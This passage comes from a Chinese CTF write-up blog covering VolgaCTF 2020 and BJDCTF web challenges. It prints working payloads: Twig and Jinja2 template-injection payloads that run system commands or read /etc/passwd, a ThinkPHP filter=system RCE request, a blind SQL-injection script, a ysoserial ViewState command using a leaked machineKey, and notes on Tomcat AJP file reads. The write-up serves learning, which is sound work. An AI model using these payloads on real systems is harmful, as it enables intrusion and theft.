<p> <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/01/3月做题/">http://blog.ccreater.top/2020/04/01/3月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cka3ckr1v0008v4v079fjgauh" data-title="3月做题" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-volgactf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/30/volgactf/" class="article-date">
  <time class="dt-published" datetime="2020-03-30T15:26:20.848Z" itemprop="datePublished">2020-03-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/03/30/volgactf/">volgactf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="volgactf"><a href="#volgactf" class="headerlink" title="volgactf"></a>volgactf</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h3><p>源码</p>
<pre><code class="php">&lt;?php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\Mime\Email;

class MainController extends AbstractController
{
    public function index(Request $request)
    {
      return $this-&gt;render(&#39;main.twig&#39;);
    }

    public function subscribe(Request $request, MailerInterface $mailer)
    {
      $msg = &#39;&#39;;
      $email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);
      if($email !== FALSE) {
        $name = substr($email, 0, strpos($email, &#39;@&#39;));

        $content = $this-&gt;get(&#39;twig&#39;)-&gt;createTemplate(
          &quot;&lt;p&gt;Hello ${name}.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;&quot;
        )-&gt;render();###这里

        $mail = (new Email())-&gt;from(&#39;newsletter@newsletter.q.2020.volgactf.ru&#39;)-&gt;to($email)-&gt;subject(&#39;VolgaCTF Newsletter&#39;)-&gt;html($content);
        $mailer-&gt;send($mail);

        $msg = &#39;Success&#39;;
      } else {
        $msg = &#39;Invalid email&#39;;
      }
      return $this-&gt;render(&#39;main.twig&#39;, [&#39;msg&#39; =&gt; $msg]);
    }


    public function source()
    {
        return new Response(&#39;&lt;pre&gt;&#39;.htmlspecialchars(file_get_contents(__FILE__)).&#39;&lt;/pre&gt;&#39;);
    }
}</code></pre>
<p>我们很容易知道这里存在ssti,但是有两个问题:</p>
<ol>
<li>FILTER_VALIDATE_EMAIL验证</li>
<li>如何接收结果</li>
</ol>
<p>第二个问题不难解决,直接用自己的vps接受就可以,第一个问题通过查询维基百科也可以构造出payload,但是payload却有长度限制,最多只能有64个字符,通常的twig ssti的payload是无法直接用的了,需要我们自己挖掘</p>
<p><a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly</a><br><a href="https://en.wikipedia.org/wiki/Email_address" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Email_address</a></p>
<p><code>python -m smtpd -n -c DebuggingServer 0.0.0.0:25</code></p>
<p>以下是我挖掘发现的payload,最后还是没能做出来,原因是自己查询的版本和题目的版本不一样</p>
<pre><code class="php">
&quot;{{app.request}}&quot;@ccreater.top
&quot;{{app.environment}}&quot;%40ccreater.top  : prod
&quot;{{app.request.request.get('name')}}&quot;@[47.107.171.219]
email=&quot;{{render(controller(app.request.request.get('a')))}}&quot;@ccreater.top&amp;a=App\Controller\MainController::source


&quot;{{render(controller(app.request.query.get(1),{'file':'flag'}))}}&quot;@ccreater.top 1=Symfony\Bundle\FrameworkBundle\Controller::file
文件名最长只能4个,并没有读到flag</code></pre>
<p>以下是wp提供的payload</p>
<p><a href="https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt" target="_blank" rel="noopener">https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt</a></p>
<pre><code>email=&quot;{{'/etc/passwd'|file_excerpt(1,30)}}&quot;@attacker.tld




POST /subscribe?0=cat+/etc/passwd HTTP/1.1
Host: newsletter.q.2020.volgactf.ru
Content-Type: application/x-www-form-urlencoded

email=&quot;{{app.request.query.filter(0,0,1024,{'options':'system'})}}&quot;@attacker.tld</code></pre><p><a href="https://twig.symfony.com/doc/3.x/functions/constant.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/functions/constant.html</a><br>VolgaCTF_6751602deea2a308ab611eeef7a4e961<br><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1</a></p>
<p>其中有一个filter_var来命令执行实在是让我惊讶</p>
<h3 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h3><p>这题挺简单的,但是我还是搞了好久,对jsp和题目的cve一点都不熟悉,搞得我写个payload都百度半天</p>
<p>端口扫描发现:</p>
<pre><code>8009/tcp open     ajp13
9090/tcp open     zeus-admin</code></pre><p>tomcat ajp前段时间刚好出了个文件读取/包含的漏洞</p>
<p>试了一下,确实存在这个洞</p>
<p>先读取/WEB-INF/web.xml</p>
<pre><code class="xml">&lt;!DOCTYPE web-app PUBLIC
 &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;
 &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;

&lt;web-app&gt;
  &lt;display-name&gt;NetCorp&lt;/display-name&gt;


  &lt;servlet&gt;
        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;
        &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;
        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;

  &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;


        &lt;servlet&gt;
                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;
                &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;
                &lt;description&gt;Complaint info&lt;/description&gt;
                &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;
        &lt;/servlet&gt;

        &lt;servlet-mapping&gt;
                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;
                &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;
        &lt;/servlet-mapping&gt;

        &lt;error-page&gt;
                &lt;error-code&gt;404&lt;/error-code&gt;
                &lt;location&gt;/404.html&lt;/location&gt;
        &lt;/error-page&gt;



&lt;/web-app&gt;</code></pre>
<p>再读取其他的class文件,其中发现一个上传点</p>
<pre><code class="java">
package ru.volgactf.netcorp;

import java.io.*;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Collection;
import java.util.Iterator;
import javax.servlet.*;
import javax.servlet.http.*;

public class ServeScreenshotServlet extends HttpServlet
{

    public ServeScreenshotServlet()
    {
        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);
    }

    public void init(ServletConfig config)
        throws ServletException
    {
        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);
    }

    public void destroy()
    {
        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException
    {
        String appPath = request.getServletContext().getRealPath(&quot;&quot;);
        String savePath = (new StringBuilder()).append(appPath).append(&quot;uploads&quot;).toString();
        File fileSaveDir = new File(savePath);
        if(!fileSaveDir.exists())
            fileSaveDir.mkdir();
        String submut = request.getParameter(&quot;submit&quot;);
        if(submut != null)
            if(submut.equals(&quot;true&quot;));
        PrintWriter out = request.getParts().iterator();
        do
        {
            if(!out.hasNext())
                break;
            Part part = (Part)out.next();
            String fileName = extractFileName(part);
            fileName = (new File(fileName)).getName();
            String hashedFileName = generateFileName(fileName);
            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();
            if(!path.equals(&quot;Error&quot;))
                part.write(path);
        } while(true);
        out = response.getWriter();
        response.setContentType(&quot;application/json&quot;);
        response.setCharacterEncoding(&quot;UTF-8&quot;);
        out.print(String.format(&quot;{&#39;success&#39;:&#39;%s&#39;}&quot;, new Object[] {
            &quot;true&quot;
        }));
        out.flush();
    }

    private String generateFileName(String fileName)
    {
        String s2;
        StringBuilder sb;
        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);
        md.update(fileName.getBytes());
        byte digest[] = md.digest();
        s2 = (new BigInteger(1, digest)).toString(16);
        sb = new StringBuilder(32);
        int i = 0;
        for(int count = 32 - s2.length(); i &lt; count; i++)
            sb.append(&quot;0&quot;);

        return sb.append(s2).toString();
        NoSuchAlgorithmException e;
        e;
        e.printStackTrace();
        return &quot;Error&quot;;
    }

    private String extractFileName(Part part)
    {
        String contentDisp = part.getHeader(&quot;content-disposition&quot;);
        String items[] = contentDisp.split(&quot;;&quot;);
        String as[] = items;
        int i = as.length;
        for(int j = 0; j &lt; i; j++)
        {
            String s = as[j];
            if(s.trim().startsWith(&quot;filename&quot;))
                return s.substring(s.indexOf(&quot;=&quot;) + 2, s.length() - 1);
        }

        return &quot;&quot;;
    }

    private static final String SAVE_DIR = &quot;uploads&quot;;
}</code></pre>
<p>于是问题解决了</p>
<h3 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h3><p>这题有点意思,让我接触了一个新的查询语言 Graphql </p>
<p>先是通过报错获知了后端是nodejs,又通过报错得知了api是Graphql </p>
<p>[PayloadsAllTheThings GraphQL]( <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection )</p>
<p>看了他们的官方文档,英文看的头都痛了,才了解一些(平常翘英语课的后果//)</p>
<p>根据他们的例子找到了一个奇怪的query name</p>
<pre><code class="json">                     &quot;name&quot;: &quot;testGetUsersByFilter&quot;,
                            &quot;description&quot;: &quot;&quot;,
                            &quot;args&quot;: [
                                {
                                    &quot;name&quot;: &quot;filter&quot;,
                                    &quot;description&quot;: &quot;&quot;,
                                    &quot;type&quot;: {
                                        &quot;kind&quot;: &quot;INPUT_OBJECT&quot;,
                                        &quot;name&quot;: &quot;UserFilter&quot;,
                                        &quot;ofType&quot;: null
                                    },
                                    &quot;defaultValue&quot;: null
                                }
                            ],
                            &quot;type&quot;: {
                                &quot;kind&quot;: &quot;LIST&quot;,
                                &quot;name&quot;: null,
                                &quot;ofType&quot;: {
                                    &quot;kind&quot;: &quot;OBJECT&quot;,
                                    &quot;name&quot;: &quot;User&quot;,
                                    &quot;ofType&quot;: null
                                }
                            },
                            &quot;isDeprecated&quot;: false,
                            &quot;deprecationReason&quot;: null</code></pre>
<p>妥妥的薄弱点<br>构造</p>
<pre><code>query testGetUsersByFilter($input: UserFilter){
    testGetUsersByFilter(filter:$input) {
        name
        login
        email
    }

}
{&quot;input&quot;:{&quot;login&quot;:&quot;\\&quot;,&quot;name&quot;:&quot; a&quot;,&quot;email&quot;:&quot;&quot;}}</code></pre><p>返回提示数据库错误,sql注入get</p>
<h3 id="User-Center"><a href="#User-Center" class="headerlink" title="User Center"></a>User Center</h3><p> <a href="https://spotless.tech/volgactf-2020-qualifier-user-center.html" target="_blank" rel="noopener">https://spotless.tech/volgactf-2020-qualifier-user-center.html</a> </p>
<p>总结:不同浏览器解析http报文的方式不同</p>
<p>子域可以修改域的cookie</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/30/volgactf/">http://blog.ccreater.top/2020/03/30/volgactf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/03/30/volgactf/" data-id="cka3ckr3d003qv4v0g4rpdahh" data-title="volgactf" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/25/BJDCTF/" class="article-date">
  <time class="dt-published" datetime="2020-03-25T05:50:32.210Z" itemprop="datePublished">2020-03-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/03/25/BJDCTF/">BJDCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><pre><code>{{%27%27.__class__.__mro__[1].__subclasses__()[-13].__init__.__globals__.__builtins__.eval(%27__import__("os").popen("find%20/%20-name%20*flag*").read()%27)}}</code></pre><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><pre><code class="php">POST /?s=captcha HTTP/1.1
Host: eb9ceebf-0bf5-4943-8580-9ccbf630568e.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;get%5B%5D=cat+/flag</code></pre>
<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><pre><code class="php">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;give me a girl&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
error_reporting(0);
echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;
if (!isset($_POST[&#39;girl_friend&#39;])) {
    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);
} else {
    $girl = $_POST[&#39;girl_friend&#39;];
    if (preg_match(&#39;/\&gt;|\\\/&#39;, $girl)) {
        die(&#39;just girl&#39;);
    } else if (preg_match(&#39;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#39;, $girl)) {
        echo &quot;&lt;img src=&#39;img/p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;
    } else {
        //duangShell~~~~
        exec($girl);
    }
}

</code></pre>
<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><pre><code class="python">username=a\&amp;password=/if(1,sleep(5),1)%23
username=a\&amp;password=/if(select/**/substr(group_concat(database()),1,1),sleep(5),1)%23
username=a\&amp;password=/if(substr(hex(password),1,1)&lt;5,sleep(5),1)%23</code></pre>
<p>过滤:<code>=,&#39;,;</code></p>
<pre><code class="python">import requests
import time
burp0_url = &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn:80/index.php&quot;
burp0_cookies = {&quot;_ga&quot;: &quot;GA1.2.212283867.1584191400&quot;, &quot;_gid&quot;: &quot;GA1.2.1374622556.1584775121&quot;}
burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),1,1)&lt;5,sleep(6),1)#&quot;}
count=0
result=&quot;&quot;
while True:
    count+=1
    for i in &quot;123456789ABCDEFG&quot;:
        burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),POS,1)&lt;GUESS,sleep(5),1)#&quot;.replace(&quot;POS&quot;,str(count)).replace(&quot;GUESS&quot;,hex(ord(i)))}
        print(burp0_data[&#39;password&#39;])
        try:
            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=5)
            time.sleep(0.5)
        except:
            result+=chr(ord(i)-1)
            print(result)
            break
print(result)#4F68794F75464F754E646974#OhyOuFOuNdit
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</code></pre>
<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>更改cookie拿到密码</p>
<p>av11664517@1583985203.</p>
<p> <a href="https://www.bilibili.com/video/av11664517" target="_blank" rel="noopener">https://www.bilibili.com/video/av11664517</a> </p>
<p> BJD{Quantum_Mechanics_really_Ez} </p>
<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><p> <a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</a> </p>
<pre><code>http://ff9359c1-85b4-4f2a-a1ad-31c1e40f186d.node3.buuoj.cn//ImgLoad.aspx?path=5.gif</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;configuration&gt;
&lt;system.web&gt;
&lt;machineKey validationKey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey=&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; validation=&quot;SHA1&quot; decryption=&quot;3DES&quot; /&gt;
&lt;/system.web&gt;
&lt;/configuration&gt;
</code></pre><p>validationKey泄露,利用viewstatas来任意命令执行</p>
<pre><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;  --generator=&quot;CA0B0334&quot;  --validationalg=&quot;SHA1&quot;  --validationkey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</code></pre><h3 id="套猪"><a href="#套猪" class="headerlink" title="套猪"></a>套猪</h3><p>登陆后找到一个提示</p>
<p> L0g1n.php</p>
<p>经过输入一系列http头后拿到flag</p>
<pre><code>GET /L0g1n.php HTTP/1.1
Host: node3.buuoj.cn:25341
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Contiki/1.1-rc1 (Commodore 64; http://dunkels.com/adam/contiki/)
From: root@gem-love.com
Referer: gem-love.com
Client-Ip: 127.0.0.1
Via: y1ng.vip
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; time=4740514103
Connection: close

</code></pre><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><pre><code class="python">import requests
import time
arr=[&quot;H&quot;, &quot;He&quot;, &quot;Li&quot;, &quot;Be&quot;, &quot;B&quot;, &quot;C&quot;, &quot;N&quot;, &quot;O&quot;, &quot;F&quot;, &quot;Ne&quot;, &quot;Na&quot;, &quot;Mg&quot;, &quot;Al&quot;, &quot;Si&quot;, &quot;P&quot;, &quot;S&quot;, &quot;Cl&quot;, &quot;Ar&quot;, &quot;K&quot;, &quot;Ca&quot;, &quot;Sc&quot;, &quot;Ti&quot;, &quot;V&quot;, &quot;Cr&quot;, &quot;Mn&quot;, &quot;Fe&quot;, &quot;Co&quot;, &quot;Ni&quot;, &quot;Cu&quot;, &quot;Zn&quot;, &quot;Ga&quot;, &quot;Ge&quot;, &quot;As&quot;, &quot;Se&quot;, &quot;Br&quot;, &quot;Kr&quot;, &quot;Rb&quot;, &quot;Sr&quot;, &quot;Y&quot;, &quot;Zr&quot;, &quot;Nb&quot;, &quot;Mo&quot;, &quot;Te&quot;, &quot;Ru&quot;, &quot;Rh&quot;, &quot;Pd&quot;, &quot;Ag&quot;, &quot;Cd&quot;, &quot;In&quot;, &quot;Sn&quot;, &quot;Sb&quot;, &quot;Te&quot;, &quot;I&quot;, &quot;Xe&quot;, &quot;Cs&quot;, &quot;Ba&quot;, &quot;La&quot;, &quot;Ce&quot;, &quot;Pr&quot;, &quot;Nd&quot;, &quot;Pm&quot;, &quot;Sm&quot;, &quot;Eu&quot;, &quot;Gd&quot;, &quot;Tb&quot;, &quot;Dy&quot;, &quot;Ho&quot;, &quot;Er&quot;, &quot;Tm&quot;, &quot;Yb&quot;, &quot;Lu&quot;, &quot;Hf&quot;, &quot;Ta&quot;, &quot;W&quot;, &quot;Re&quot;, &quot;Os&quot;, &quot;Ir&quot;, &quot;Pt&quot;, &quot;Au&quot;, &quot;Hg&quot;, &quot;Tl&quot;, &quot;Pb&quot;, &quot;Bi&quot;, &quot;Po&quot;, &quot;At&quot;, &quot;Rn&quot;, &quot;Fr&quot;, &quot;Ra&quot;, &quot;Ac&quot;, &quot;Th&quot;, &quot;Pa&quot;, &quot;U&quot;, &quot;Np&quot;, &quot;Pu&quot;, &quot;Am&quot;, &quot;Cm&quot;, &quot;Bk&quot;, &quot;Cf&quot;, &quot;Es&quot;, &quot;Fm&quot;,&quot;Md&quot;,&quot;No&quot;,&quot;Lr&quot;,&quot;Ku&quot;,&quot;Ha&quot;]

url=&quot;http://aca57d0d-cd67-498b-a8ea-09588ab05db6.node3.buuoj.cn/&quot;
for i in arr:
    r=requests.get(url+i+&quot;.php&quot;)
    if r.status_code==200:
        print(r.text,end=&quot;&quot;)
    time.sleep(0.5)
</code></pre>
<p><code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code></p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>sb题目</p>
<p>index.php</p>
<pre><code class="php">&lt;?php
   $a=$_GET[&#39;yds_is_so_beautiful&#39;];
    echo unserialize($a);
   ?&gt;</code></pre>
<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>http头中找到hint:<code>home.php</code></p>
<pre><code>http://3801f870-f245-47ef-8325-1e117f384eb8.node3.buuoj.cn/home.php?file=system</code></pre><p>尝试文件包含,拿到源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !== sha1(md5(&#39;y1ng&#39;))){
    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;/script&gt;&quot;;
    header(&quot;Refresh:0.1;url=index.php&quot;);
    die;
}

$str2 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;
$str3 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;
$str4 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
    &lt;title&gt;File Detector&lt;/title&gt;

    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/normalize.css&quot; /&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/demo.css&quot; /&gt;

    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/component.css&quot; /&gt;

    &lt;script src=&quot;js/modernizr.custom.js&quot;&gt;&lt;/script&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;section&gt;
    &lt;form id=&quot;theForm&quot; class=&quot;simform&quot; autocomplete=&quot;off&quot; action=&quot;system.php&quot; method=&quot;post&quot;&gt;
        &lt;div class=&quot;simform-inner&quot;&gt;
            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;
            &lt;ol class=&quot;questions&quot;&gt;
                &lt;li&gt;
                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ ç¥éç®å½ä¸é½æä»ä¹æä»¶å?&lt;/label&gt;&lt;/span&gt;
                    &lt;input id=&quot;q1&quot; name=&quot;q1&quot; type=&quot;text&quot;/&gt;
                &lt;/li&gt;
                &lt;li&gt;
                    &lt;span&gt;&lt;label for=&quot;q2&quot;&gt;è¯·è¾å¥ä½ æ³æ£æµæä»¶åå®¹é¿åº¦çurl&lt;/label&gt;&lt;/span&gt;
                    &lt;input id=&quot;q2&quot; name=&quot;q2&quot; type=&quot;text&quot;/&gt;
                &lt;/li&gt;
                &lt;li&gt;
                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ å¸æä»¥ä½ç§æ¹å¼è®¿é®ï¼GETï¼POST?&lt;/label&gt;&lt;/span&gt;
                    &lt;input id=&quot;q3&quot; name=&quot;q3&quot; type=&quot;text&quot;/&gt;
                &lt;/li&gt;
            &lt;/ol&gt;
            &lt;button class=&quot;submit&quot; type=&quot;submit&quot; value=&quot;submit&quot;&gt;æäº¤&lt;/button&gt;
            &lt;div class=&quot;controls&quot;&gt;
                &lt;button class=&quot;next&quot;&gt;&lt;/button&gt;
                &lt;div class=&quot;progress&quot;&gt;&lt;/div&gt;
                &lt;span class=&quot;number&quot;&gt;
                    &lt;span class=&quot;number-current&quot;&gt;&lt;/span&gt;
                    &lt;span class=&quot;number-total&quot;&gt;&lt;/span&gt;
                &lt;/span&gt;
                &lt;span class=&quot;error-message&quot;&gt;&lt;/span&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;span class=&quot;final-message&quot;&gt;&lt;/span&gt;
